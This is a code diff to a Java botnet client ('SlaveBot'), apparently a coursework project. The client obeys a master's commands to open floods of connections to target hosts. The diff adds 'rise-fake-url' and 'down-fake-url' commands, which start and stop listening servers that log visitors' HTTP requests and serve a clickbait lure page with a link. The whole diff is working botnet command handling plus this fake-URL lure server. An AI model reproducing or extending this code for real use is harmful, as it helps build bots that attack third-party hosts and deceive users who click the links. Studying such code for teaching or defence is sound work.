@@ -15,6 +15,12 @@ import java.io.*;
 import java.util.*;
 import java.net.*;
 import java.text.*;
+import java.util.concurrent.CopyOnWriteArrayList;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.io.IOException;
+import java.io.PrintWriter;
 
 public class SlaveBot {
 
@@ -29,6 +35,9 @@ public class SlaveBot {
     Socket sock ;
     //Hashset to store all targets objects.
     HashSet <Tgt>  tgtSet = new HashSet <Tgt> () ;
+
+    //proj3
+    CopyOnWriteArrayList <srvInst> serverPortsSet = new CopyOnWriteArrayList<>();
     /* main
      *Input  : user cmd from master
      *         1) connect ;
@@ -98,26 +107,42 @@ public class SlaveBot {
                         //connect command from master
                         splitcmd = message.split(" ");
                         cmd = splitcmd[0];
-                        tgtName = splitcmd[2];
-                        ipAddr = InetAddress.getByName(tgtName);
-                        //tgtPort = Integer.parseInt(splitcmd[3]);
-                        if ( splitcmd.length>= 4) {
-                            tgtPortStr = splitcmd[3];
+
+                        //Comands types
+                        boolean isConCmds=false;
+                        boolean isFakeUrlCmds=false;
+                        //proj3 :  rise-fake-url/down-fake-url -p <> -url <>
+                        if (cmd.equalsIgnoreCase("rise-fake-url") || cmd.equalsIgnoreCase("down-fake-url") ) {
+                            tgtName = splitcmd [2] ;
+                            ipAddr = InetAddress.getByName(tgtName);
+                            tgtPortStr = splitcmd [1] ;
+                            tgtPort = Integer.parseInt(splitcmd[1]);
+
+                            isFakeUrlCmds = true ;
                         } else {
-                            tgtPortStr = "all" ;
+                            //proj1&2 :  connect/disconnect
+                            tgtName = splitcmd[2];
+                            ipAddr = InetAddress.getByName(tgtName);
+                            //tgtPort = Integer.parseInt(splitcmd[3]);
+                            if (splitcmd.length >= 4) {
+                                tgtPortStr = splitcmd[3];
+                            } else {
+                                tgtPortStr = "all";
+                            }
+                            isConCmds = true ;
                         }
 
                         //proj2 : add keepalive option in "connect"
                         boolean keepAlive=false ;
-
-                        if (!tgtPortStr.equalsIgnoreCase("all")){
-                            tgtPort = Integer.parseInt(splitcmd[3]);
-                        }
-                        //Proj2 : add keepalive option.
-                        if ((splitcmd.length) >= 5 && splitcmd[4].matches("[0-9]+")) {
-                            numConn = Integer.parseInt(splitcmd[4]);
-                        } else {
-                            numConn = 1;
+                        numConn = 1;
+                        if (isConCmds) {
+                            if (!tgtPortStr.equalsIgnoreCase("all")) {
+                                tgtPort = Integer.parseInt(splitcmd[3]);
+                            }
+                            //Proj2 : add keepalive option.
+                            if ((splitcmd.length) >= 5 && splitcmd[4].matches("[0-9]+")) {
+                                numConn = Integer.parseInt(splitcmd[4]);
+                            }
                         }
                         //Commands Types:
                         if (cmd.equalsIgnoreCase("connect")) {
@@ -151,6 +176,23 @@ public class SlaveBot {
                         //dis-connect command from master
                         else if (cmd.equalsIgnoreCase("disconnect")) {
                             delConns(ipAddr, tgtPortStr);
+                        }
+                        //proj3
+                        else if (cmd.equalsIgnoreCase("rise-fake-url" ) ) {
+                            ServerSocket srvSock=isSrvPortUsing(tgtPort);
+                            if (srvSock==null) {
+                                Thread t_url_conn = new Thread(new urlReqServer(tgtPort));
+                                t_url_conn.start();
+                            }
+                        }
+                        else if (cmd.equalsIgnoreCase("down-fake-url" ) ) {
+                            ServerSocket srvSock = delSrvPortUsing(tgtPort);
+                            if (srvSock != null) {
+                                srvSock.close();
+                                System.out.println("Deleted server socket from port :" + tgtPort);
+                            } else {
+                                System.out.println("Try to Deleted invalid server socket from port :" + tgtPort);
+                            }
                         }
                         //others
                         else {
@@ -294,11 +336,98 @@ public class SlaveBot {
         }
     }
 
+    /*
+     * Check whether srvPort is servering
+     */
+    public ServerSocket isSrvPortUsing (int srvPort) {
+        for (int idx=0;idx<serverPortsSet.size();idx++) {
+            srvInst element =serverPortsSet.get(idx);
+            if ( element.srvPort==srvPort ) {
+                return element.srvSock ;
+            }
+        }
+        return null;
+    }
+
+    public ServerSocket delSrvPortUsing (int srvPort) {
+        for (int idx=0;idx<serverPortsSet.size();idx++) {
+            srvInst element =serverPortsSet.get(idx);
+            if ( element.srvPort==srvPort ) {
+                serverPortsSet.remove(idx);
+                return element.srvSock ;
+            }
+        }
+        return null;
+    }
+
     public void printTgtConns () {
         for (Tgt tgt: tgtSet) {
             tgt.printTgtStauts();
         }
     }
+
+    /*
+     * Class : urlReq server thread
+     */
+    public class urlReqServer implements Runnable {
+        ServerSocket serverSock ;
+        int srvPort ;
+        //constructor
+        urlReqServer(int port) {
+            try {
+                srvPort = port;
+                //serverSock = new ServerSocket(srvPort);
+                srvInst sInst = new srvInst(srvPort);
+                serverSock = sInst.srvSock ;
+                serverPortsSet.add(sInst);
+                System.out.println("Listening for url connection from port :"+srvPort+"....");
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }
+        //Runnable
+        public void run (){
+            try {
+                while (!serverSock.isClosed()) {
+                    if (serverSock.isClosed()) {
+                        break;
+                    }
+                    Socket client = serverSock.accept();
+                    BufferedReader inUrlReq = new BufferedReader(new InputStreamReader(client.getInputStream()));
+                    PrintWriter outUrlRsp = new PrintWriter(client.getOutputStream()) ;
+
+                    String urlReqStr ;
+                    while ((urlReqStr =inUrlReq.readLine())!=null) {
+                        if (urlReqStr.length() == 0 ) break;
+                        System.out.println(urlReqStr);
+                    }
+                    outUrlRsp.println("HTTP/1.1 200 ");
+                    outUrlRsp.println("Content-Type:text/plain ");
+                    outUrlRsp.println("Content:close");
+                    outUrlRsp.println("");
+                    outUrlRsp.println("This is Important,Check this out!");
+
+                    String link="<a href='http://localhost:8080' target='_blank'>http://localhost:8080</a>";
+                    outUrlRsp.println(link);
+                    outUrlRsp.flush();
+                    /*
+                    outUrlRsp.flush();
+                    Date today= new Date();
+                    String httpRsp = "HTTP/1.1 200 OK\r\n\r\n"+today;
+                    client.getOutputStream().write(httpRsp.getBytes("UTF-8"));
+                    */
+
+                    inUrlReq.close();
+                    outUrlRsp.close();
+                    client.close();
+                }
+            } catch (Exception ex) {
+                //ex.printStackTrace();
+                System.out.println("Catched runtime exception : socket closed at port");
+            }
+        }
+    }
+
     /* Sub-class :  Tgt
      * @tgtName : target name
      * @tgtPort : target port
@@ -393,4 +522,22 @@ public class SlaveBot {
 
     }
 
+    /*
+     * proj3 : add server listing risk-fake-url/down-fake-url
+     */
+    class srvInst {
+        int srvPort;
+        ServerSocket srvSock;
+        String url = "";
+
+        srvInst(int port) {
+            srvPort = port;
+
+            try {
+                srvSock = new ServerSocket(srvPort);
+            } catch (Exception ex) {
+                ex.printStackTrace();
+            }
+        }
+    }
 } //close class MaterBot
